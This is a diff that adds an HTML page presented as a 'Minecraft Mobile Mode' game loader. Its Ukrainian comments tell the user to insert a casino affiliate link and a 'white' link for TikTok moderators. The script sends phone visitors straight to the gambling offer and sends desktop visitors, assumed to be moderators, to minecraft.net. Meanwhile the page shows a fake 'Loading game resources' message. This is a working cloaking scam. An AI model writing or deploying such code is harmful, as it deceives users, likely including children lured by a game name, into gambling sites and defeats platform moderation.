@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Mobile Mode</title>
+    <script>
+        window.onload = function() {
+            // СУДИ ВСТАВ СВОЄ ПАРТНЕРСЬКЕ ПОСИЛАННЯ НА КАЗИНО:
+            var realOffer = "https://click.mytraffgun.com/click?pid=493&offer_id=443"; 
+            
+            // СУДИ ВСТАВ БІЛЕ ПОСИЛАННЯ ДЛЯ МОДЕРАТОРІВ ТІКТОК:
+            var whitePage = "https://www.minecraft.net/"; 
+
+            // Скрипт перевіряє, чи пристрій є мобільним (iOS / Android)
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                // Якщо людина з телефону — миттєвий редірект на казино
+                window.location.href = realOffer;
+            } else {
+                // Якщо з комп'ютера (модератор) — перенаправлення на білий сайт
+                window.location.href = whitePage;
+            }
+        };
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 20%; font-family: sans-serif; color: #333;">
+        <h2>Loading game resources...</h2>
+        <p>Please wait a moment.</p>
+    </div>
+</body>
+</html>
